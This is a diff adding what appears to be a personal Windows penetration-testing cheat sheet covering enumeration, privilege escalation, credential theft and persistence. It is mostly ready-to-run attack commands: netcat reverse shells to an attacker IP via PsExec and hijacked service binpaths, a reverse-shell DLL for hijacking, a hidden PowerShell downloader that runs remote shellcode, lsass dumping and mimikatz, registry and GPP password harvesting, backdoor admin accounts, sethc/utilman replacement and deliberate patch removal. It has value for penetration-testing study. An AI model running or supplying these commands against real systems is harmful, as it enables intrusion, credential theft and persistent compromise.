@@ -1,0 +1,411 @@
+
+
+!!!!!=====Windows Initial Information Gathering=====!!!!!!
+
+=== Local information
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+hostname
+echo %username%
+net users
+net user <username>
+
+Scheduled tasks:
+schtasks /query /fo LIST /v
+
+link running processes to started services
+tasklist /SVC
+net start
+DRIVERQUERY
+
+
+=== Network information
+ipconfig
+route print
+arp -A
+
+Active network connections and firewall rules
+netstat -ano
+netsh firewall show state
+netsh firewall show config
+
+netsh advfirewall firewall add rule name="Open SMB" protocol=TCP dir=in localport=445 action=allow
+netsh advfirewall firewall add rule name="Open RDP" protocol=TCP dir=in localport=3389 action=allow
+
+=== Information gathering using WMIC
+wmic info batch script to gather: processes, services, user accounts, user groups, network interfaces
+hdd information, Network share info, installed Win patches, startup programs, installed software,
+info about OS
+http://fuzzysecurity.com/tutorials/files/wmic_info.rar
+
+Getting installed patches
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+Grep  particular patches
+wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."    //replace .. by a particular patch
+
+
+KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799)
+wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB979682" /C:"KB2393802" /C:"KB982799" /C:"KB979683" /C:"KB2592799"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+!!!!!=====Windows: From user to admin=====!!!!!
+
+=== Look for Creds on the box
+
+dir /s *pass*
+dir /s *cred*
+dir /s *vnc*
+dir /s *.config
+dir /b /s web.config
+
+Searching file types containing a keyword
+findstr /si password *.xml *.ini *.txt
+
+type C:\sysprep.inf
+type C:\sysprep\sysprep.xml [base64]
+
+post/windows/gather/credentials/*
+
+dir /a
+to make hidden files/folders visible
+
+=== Registry information
+
+Grep the registry for keywords
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+reg query HKLM\SOFTWARE\
+
+In windows 2000 (reg query does not work) write registry values into a file -> use cat in linux to read the information
+regedit /e C:\Inetpub\ftproot\test.reg HKEY_LOCAL_MACHINE\SOFTWARE\
+In Windows XP, searching for a key does not work: export, transfer and search in linux:
+reg export HKCU hkcu.reg
+
+
+== VNC Password in registry
+in e.g. [HKEY_LOCAL_MACHINE\SOFTWARE\\RealVNC\WinVNC4]
+"Password"=hex:2a,97,1f,c5,48,e0,5e,c2
+"SecurityTypes"="VncAuth"
+"ReverseSecurityTypes"="None"
+
+can be cracked using wine vncpwd.exe 2a971fc548e05ec2
+where the last argument is the registry value of "password"
+
+
+=== Found any credentials?
+PsExec.exe /accepteula -u user -p userishere -s C:\Users\Administrator\Desktop\nc.exe -nv 10.11.0.243 4444 -e cmd.exe
+
+PsExec.exe /accepteula -u user -p userishere "C:\HFS\nc.exe" -nv 10.11.0.243 21 -e cmd.exe
+
+=== Group Policy Preference XML files:
+Groups.xml stored in SYSVOL
+
+On a domain machine as domain user:
+
+net use z: \\dcname\SYSVOL
+
+z:			->to switch Drive
+
+dir /s Groups.xml
+
+copy path C:\pathto\homedir
+
+-> contains encrypted password, decription Key publicly available from MS
+Other policy preference files containig passwords:
+	Services\Services.xml: Element-Specific Attributes
+	ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
+	Printers\Printers.xml: SharedPrinter Element
+	Drives\Drives.xml: Element-Specific Attributes
+	DataSources\DataSources.xml: Element-Specific Attributes
+
+Automating the process using Get-GPPPassword from Powersploit
+
+=== Unattended
+
+Unattended.xml many times setting the local admin pw
+%WINDIR%\Panther\Unattended\
+%WINDIR%\Panther\
+No authentication is needed to gather Unattended.xml
+-> Just need to find the "Windows Deployment Services" server
+
+auxiliary/scanner/dcerpc/windows_deployment_services
+
+=== AlwasyInstallElevated
+Allow standard users to install MSI files wihtout admin
+HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+can be checked with:
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+
+
+=== Print Services which can be accessed with a certain user level
+
+//Accpting sysinterls EULA in registry
+REG ADD HKCU\Software\Sysinternals\AccessChk /v EulaAccepted /t REG_DWORD /d 1 /f
+
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+accesschk.exe /accepteula -uwcqv "Users" *
+accesschk.exe /accepteula -uwcqv "Everyone" *
+accesschk.exe /accepteula -ucqv <service>
+
+Service Permissions:
+http://fuzzysecurity.com/tutorials/images/priv02_big.png
+any of these access rights will give a SYSTEM shel
+
+--> Can we edit the service config? (using sc command in binpath service modify below)
+--> Can we edit the binary it points to?
+
+=== Binpath Service Modify
+accesschk.exe /accepteula -uwcq * | findstr /v AUTHORITY | findstr /v Administrators
+
+
+Binpath mod:
+
+sc config badsrvc binpath= "net user julra password12 /add" type = interact			//run it a second time: adding the user to the local admins group
+																																								sc config badsrvc binpath= "net localgroup administrators julra /add"
+ggf. sc config badsrvc obj= ".\LocalSystem" password= ""
+
+or executing uploaded files with sys privileges
+sc config upnphost binpath= "C:\Inetpub\Scripts\nc.exe -nv 10.11.0.243 443 -e C:\Windows\System32\cmd.exe"
+sc config upnphost binpath= "C:\Inetpub\Scripts\reverse443.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""									//!!May be necessary to get SYSTEM privileges
+
+sc start badsrvc
+--> looks like the service fails but the command is executed
+--> Inspect the error, maybe the service must be configured appropriately -> start dependencies or enable the service
+Enabling a service:
+sc config badsrvc start= auto
+
+//Accpting sysinterls EULA in registry
+REG ADD HKCU\Software\Sysinternals\AccessChk /v EulaAccepted /t REG_DWORD /d 1 /f
+
+
+=== Weak File permissions
+Look for writable files
+	-Autoruns?
+	-Scheduled tasks?
+accesschk.exe /accepteula -qwsu "Authenticated Users" C:\
+accesschk.exe /accepteula -qwsu "Users" C:\
+accesschk.exe /accepteula -qwsu "Everyone" C:\
+
+=== Missing Autoruns
+C:\sysinternals>autorunsc.exe -a | findstr /n /R "File\ not\ found"
+
+=== Service Quouting
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\"| findstr /i /v """
+(XP requires admin, Vista+ user)
+Non admin in XP:
+sc query -> get list of services
+sc qc "<service name>"
+-> look for unquoted binary_path_name
+Create an exploit that abuses the bad path ->  THPB3 p.116
+
+=== DLL hijacking
+If a privileged program includes a missing dll, windows search for it in this order:
+You can see the DLL search order on 32-bit systems below:
+1 - The directory from which the application loaded
+2 - 32-bit System directory (C:\Windows\System32)
+3 - 16-bit System directory (C:\Windows\System)
+4 - Windows directory (C:\Windows)
+5 - The current working directory (CWD) <<--exploitable
+6 - Directories in the PATH environment variable (system then user)  <<--exploitable
+
+Place the payload and name it as the missing dll in 5 or 6, since the rest is not writable for unprivileged users
+
+To find missing dll use sysinternals procmon
+REG ADD HKCU\Software\Sysinternals\Procmon /v EulaAccepted /t REG_DWORD /d 1 /f
+include a filter to filter dlls with name not found as the result
+ -> include ".dll"
+ -> include "NAME NOT FOUND"
+ -> include folder in path
+
+
+In windows 7 the IKEEXT service is loadoed but a dll is missing, dll is called wlbsctrl.dll
+Create a payload:
+msfpayload windows/shell_reverse_tcp lhost='<ip>' lport='9988' D > /root/Desktop/evil.dll
+The payload is going to be stored in a file called wlbsctrl.dll
+than checking the PATH env variable -> echo %path%
+checking the permissions of a directory included in PATH
+e.g. C:\Python27
+with
+accesschk.exe -dqv "C:\Python27"
+or
+cacls "C:\Python27"
+Copying the file to the directory
+copy evil.dll C:\Python27\wlbsctrl.dll
+-> Reboot the machine to reload the service
+
+=== Scripts to check and elevate privileges
+Git Hub Pentest Monkey: Windows-privesc-check
+Powerup from Powersploit
+Exploitng weak service permissions CHECK OUT srvcheck v.3
+
+
+=== Somewhere else administrator?
+Powerview script from Powersploit
+--> Find-LocalAdminAccess
+Quries the Domain controller for a machine where the current user has local admin privileges
+
+Usage:
+powershell -exec bypass
+PS C:\> import module .\powerview.ps						or Import-Module
+PS C:\> Find-LocalAdminAccess
+DOMAIN.machine
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+!!!!!=====Windows: From admin to system=====!!!!!
+
+=== Sysinternals psexec
+psexec /accepteula -i -s -d cmd.exe						NOTES: via RDP -> it creates a new command window (without -i it creates a new process)
+																							EULA:  HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x01
+																							REG ADD HKCU\Software\Sysinternals\PsExec /v EulaAccepted /t REG_DWORD /d 1 /f
+
+
+#Spawn a reverse shell with system privileges
+PsExec.exe -s C:\Users\Administrator\Desktop\nc.exe -nv 10.11.0.243 4444 -e cmd.exe
+
+
+=== Changing the Service binary path
+on XP SP0&SP1: reconfiguring the service, run any binary with SYSTEM level privileges:
+
+Service info:
+sc qv <service>
+Changing service:
+sc config <service> binpath="C:\nc.exe -nv <ip> <port> -e cmd.exe"
+sc config <service> obj= ".\LocalSystem" password=""
+Service info:
+sc qc <service>
+net start <service>
+
+=== Binary Replacement
+Replace Service binary with your own binary
+1. stop service (net stop <service>)
+2. replace binary
+3. start service (net start <service>)
+
+=== AT
+at <time> /interactive cmd
+executes cmd as system
+
+or e.g.
+net use \\targetserver /user:DOMAIN\user pass
+net time \\targetserver
+at \\targetserver 13:20 C:\temp\evil.bat
+
+EXECUTES as system, must be admin to do it
+
+at 13:37 C:\debuggers\remote.exe /s cmd SYSCMD
+Connect to the debugger
+C:\debuggers\remote.exe /c 127.0.0.1 SYSCMD
+
+NTSD can be used for this as well
+
+=== schtasks
+Any user can create a task
+
+Options like ONCE ONIDLE ONLOGON ONSTART
+
+e.g. onstart copi evil bin to random location and start it
+
+
+
+!!!!!=====Windows: Persistence=====!!!!!
+WCE and mimikatz
+wdigest (your AD password)
+kerberos (your LM / NTLM hash)
+ssp (your outlook password)
+livessp (your wind8 password)
+msv (your AD password)
+tspkg (your AD password)
+
+=== PAsswords through process dumping
+
+procdump.exe -ma lsass %CNAME%.dmp
+at 13:37 C:\procdump.bat
+result in <targetserver>.dmp
+
+=== SETHC / UTILMAN
+
+Replace %Windir%\System32\sethc.exe
+Replace %WINDIR%\System32\utilman.exe
+--> Hit SHIFT 5 times -> sethc.exe run by system
+--> Win Key + U = utilman.exe run by system
+
+must be done "offline"
+If NLA is enabled, or RDP is disabled, it won't work
+
+===Exporting wireless configs
+
+netsh wlan export profile key=clear
+
+===Powershell downloader
+--> Schedule this and it will execute the shellcode on that page, pulling it each time (so you can change as needed)
+powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://192.168.172.1:8080/myshellcode'))"
+
+=== Password filters hooking
+Reflective DLL injection w/ Powershell (in-memory) hooking
+github: clymb3r/Misc-Windows-Hacking/HookPasswordChange
+
+=== SSPI (requires reboot)
+Kiwissp.dll
+1.compile
+2. drop in system32
+3. "Security Packages registry key
+4. Wait for passwords
+
+=== Command Line PPTP Tunnel
+post/windows/manage/pptp_tunnel
+Create a pptp tunnel between victim and attacker
+
+MS created PPTP to be resilient to network drops and changes
+
+=== Patch uninstalling
+Not recommended but:
+Uninstall a patch to make the client vulnerable, then exploit the vulnerability
+wusa.exe /uninstall /kb:926932
+
+
+
+
+
+
+
+#==== MIMIKATZ
+log
+privilege::debug
+sekurlsa::logonpasswords
+
+
+#=== Priv esc checker
+python windows-exploit-suggester.py -i /mnt/hgfs/shared_folder/going/49/priv_escal/sysinfo.txt -d 2018-12-13-mssb.xls
